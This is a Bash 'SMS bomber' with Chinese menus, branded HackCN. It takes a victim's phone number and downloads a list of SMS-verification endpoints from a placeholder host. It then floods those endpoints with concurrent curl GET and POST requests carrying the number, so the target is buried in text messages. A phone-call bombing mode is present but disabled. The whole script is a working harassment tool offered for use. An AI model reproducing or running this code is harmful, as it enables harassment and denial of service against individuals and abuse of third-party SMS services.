#!/bin/bash
if [ "$UID" != 0 ];then echo "以root用户运行!";exit 0;fi
killpid() {
echo -e "\033[0m"
killall bash 2>/dev/null
sleep 2
killall curl 2>/dev/null
sleep 1
killall curl 2>/dev/null
}
smspore(){
	sed -i "s/\$phone/$number/g" /tmp/smsfile
	k=0
	q=0
	g=0
	Postnumber=`cat /tmp/smsfile|sed -n "/|/p"|wc -l`
	number=`cat /tmp/smsfile|wc -l`
	Getnumber=`expr $number - $Postnumber`
	echo -e "\e[1;33m--------------------------------"
	echo -e "${b1}* 加载Get 接口:"$Getnumber"条\n* 加载Post接口:"$Postnumber"条${b2}"
	echo -e "\e[1;33m* 使用ctrl + c来关闭"
	echo -e "* 本脚本于2016/08/06日更新"
#	echo -e "* 号码可提交管理员签署保护协议，免被轰炸 "
	echo "---------------------------------"
	if [ -f "/tmp/file" ];then 
	    cat /tmp/file|tr '[a-gH-Y]' '[0-56-9]' >/tmp/smsprivacy
		for p in `cat /tmp/smsprivacy`
		do
			if [ "$number" -eq "$p" ];then echo "该号码已签署保护协议，bomb无法轰炸！";sleep 2;rm /tmp/smsprivacy;q=1;break;fi
		done
	fi
	if [ $q -eq 1 ];then continue ;fi
	for i in `cat /tmp/smsfile`
	do
		echo $i| sed -n "/|/p" >/tmp/smslog
		if [ -s "/tmp/smslog" ];then
			url1=`echo $i|cut -d"|" -f1`
			url2=`echo $i|cut -d"|" -f2`
			{
				curl -o /dev/null -s -A "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" -d "$url2" "$url1"
			}&
			sleep 0.5
			let k=$k+1
			time=`ps|awk '{print $4}'|grep 'curl'|wc -l`
			if [ $time -gt 20 ];then echo "网速过慢至并发线程过多，等待...";sleep 5;fi 
			printf "  Post轰炸目标:%d次   \r" $k
	else
			trap 'echo 结束\n;killpid;smsrm' INT
			{
			curl -o /dev/null -s -A "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" -l $i
			}&
			sleep 0.5
			let g=$g+1
			time=`ps|awk '{print $4}'|grep 'curl'|wc -l`
			if [ $time -gt 20 ];then echo "网速过慢至并发线程过多，等待...";sleep 5;fi 
			printf "  Get轰炸目标:%d次   \r" $g
		fi 
	done
	killpid
	smsrm
	echo -e "结束！\033[0m"
}
smsrm() {
rm /tmp/smsfile
rm /tmp/smsprivacy
rm /tmp/file
}
sms_image(){
echo -e "${b1}#==================HackCN=================#${b2}"
echo -e "${b1}<                                         >${b2}"
echo -e "${b1}<       attack    /ˉ|   /ˉ|     medusa    >${b2}"
echo -e "${b1}<     s          //||  //||   s           >${b2}"
echo -e "${b1}<      cydia    // || // ||    linux      >${b2}"
echo -e "${b1}<           s  //  ||//  ||         s     >${b2}"
echo -e "${b1}<    hacker   //   |_/   || version       >${b2}"
echo -e "${b1}<                                   2.0   >${b2}"
echo -e "${b1}#=========================================#${b2}"
echo "                              $⇒ by.CraK⏎"
}

b1='\E[1;32m'
b2='\E[0m'
d1='\033[32m'
d2='\033[0m'
clear
while :;do
sms_image
echo 
echo -n "Bomb 轰炸机 -"
echo -e "\E[1;35m Linux/IOS/Android \E[0m"
echo
echo -e "\e[1;33m [1]短信轰炸 - 欢迎提供好的接口";
echo -e " [2]电话轰炸 - 暂停使用";
echo -e " [0]退出";
echo
echo -e "输入选择数"
read -p "[>] " math
case "$math" in
1)
content=`cat /tmp/smslog2 2> /dev/null`
echo -e "----------------------"
echo -e "上次历史:"$content""
echo -e "----------------------"
echo -e "输入短信号码"
read -p "[>] " number
if [ -z "$(echo $number| sed -n "/^[0-9]\+$/p")" ]; then echo "输入为错误！！！";sleep 1;continue
else
	echo $number > /tmp/smslog2
	which wget >/dev/null 2>&1
	if [ $? -ne 0 ];then echo "wget未安装！cydra搜索并安装";continue;fi
	echo -e "\e[1;31m[!] 加载最新接口中...\033[0m"
	wget -q -O /tmp/smsfile http://xxxxx/sms
#	wget -q -O /tmp/file http://xxxxx/file/bomb/file
	wait;echo -e "\033[32m[>] 完成\033[0m"
	smspore
fi
;;
2) 
content=`cat /tmp/smslog2 2> /dev/null`
echo -e "----------------------"
echo -e "上次历史:"$content""
echo -e "----------------------"
echo -e "输入手机号码"
read -p "[>] " number
if [ -z "$(echo $number| sed -n "/^[0-9]\+$/p")" ]; then echo "输入为错误！！！";sleep 1;continue
else
	echo $number > /tmp/smslog2
	which wget >/dev/null 2>&1
	if [ $? -ne 0 ];then echo "wget未安装！cydra搜索并安装";continue;fi
	echo -e "\e[1;31m[!] 加载最新接口中...\033[0m"
#	wget -q -O /tmp/smsfile http://xxxxx/file/bomb/phone
#	wget -q -O /tmp/file http://xxxxx/file/bomb/file
	wait;echo -e "\033[32m[>] 完成\033[0m"
	echo -e "\e[1;31m[!] 此功能暂未开放\033[0m"
#	smspore
fi
;;
0) 
echo -e "\033[0m"
killpid
exit 0
;;
[a-z]|[A-Z])
echo "输入错误，重新输入"
sleep 2
continue
esac
echo -e "\033[0m"
done
echo -e "\033[0m"
